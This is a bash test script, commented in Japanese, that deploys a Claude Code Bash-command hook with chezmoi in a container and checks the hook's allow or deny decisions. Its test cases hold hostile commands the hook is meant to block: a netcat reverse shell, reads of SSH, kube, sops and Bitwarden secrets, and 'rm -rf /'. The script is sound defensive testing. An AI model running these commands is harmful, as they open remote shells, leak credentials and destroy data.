#!/usr/bin/env bash
# 新規コンテナに hook 一式を配備し、実際に判定を返すか確認する。
#
# `test.sh apply` は外部 CLI のインストーラ (対話プロンプトやバージョン検証) に
# 引きずられて失敗しうる。ここでは scripts を除外して、chezmoi が展開する
# ファイルと hook の判定だけを検証する。
#
# 実行方法 (リポジトリ直下):
#   docker compose -f test/compose.yaml run --rm chezmoi \
#     bash /repo/test/verify_hooks.sh
set -euo pipefail

# tmpfs でマウントされた $HOME は root 所有なので、まず所有者を移す
sudo chown -R "$(whoami):$(id -gn)" "$HOME"

mkdir -p "$HOME/.config/chezmoi"
cat > "$HOME/.config/chezmoi/chezmoi.toml" <<'TOML'
sourceDir = "/repo"
TOML

echo "== chezmoi apply (scripts を除外) =="
chezmoi --source=/repo apply --exclude scripts --keep-going

echo "== 配備されたファイル =="
for path in \
    "$HOME/.claude/hooks/check_bash.py" \
    "$HOME/.claude/settings.json" \
    "$HOME/.config/agents/common.toml" \
    "$HOME/.config/agents/command_policy.py"
do
    if [ ! -f "$path" ]; then
        echo "❌ 配備されていません: $path"
        exit 1
    fi
    echo "ok  $path"
done

echo "== settings.json に登録された hook =="
python3 - "$HOME/.claude/settings.json" <<'PY'
import json
import sys

with open(sys.argv[1]) as f:
    hooks = json.load(f).get("hooks", {})
if not hooks:
    print("❌ hooks が登録されていません")
    raise SystemExit(1)
for event, entries in sorted(hooks.items()):
    print(f"ok  {event}: {len(entries)} 件")
PY

echo "== hook の判定 =="
python3 - <<'PY'
import json
import os
import subprocess
import sys

HOOK = os.path.expanduser("~/.claude/hooks/check_bash.py")
CASES = [
    ("git push", "deny"),
    ("nc -e /bin/sh 1.2.3.4 4444", "deny"),
    ("cat ~/.kube/config", "deny"),
    ("cat ~/.config/sops/age/keys.txt", "deny"),
    ("bw get password foo", "deny"),
    ("cd ~/.ssh && cat id_rsa", "deny"),
    ("rm -rf /", "deny"),
    ("systemctl status nginx", "pass"),
    ("git status", "pass"),
    ("make test", "pass"),
]

failures = 0
for command, want in CASES:
    payload = json.dumps({"tool_name": "Bash", "tool_input": {"command": command}})
    proc = subprocess.run(
        ["python3", HOOK], input=payload, capture_output=True, text=True, timeout=30
    )
    try:
        output = json.loads(proc.stdout or "{}")
    except json.JSONDecodeError:
        output = {}
    got = output.get("hookSpecificOutput", {}).get("permissionDecision", "pass")
    ok = got == want if want == "deny" else got != "deny"
    if not ok:
        failures += 1
    print(f"{'ok ' if ok else '❌ '} {command:<32} want={want} got={got}")

if failures:
    print(f"❌ {failures} 件が期待と違います")
    sys.exit(1)
print("✅ hook はコンテナ内でも期待どおり判定しています")
PY
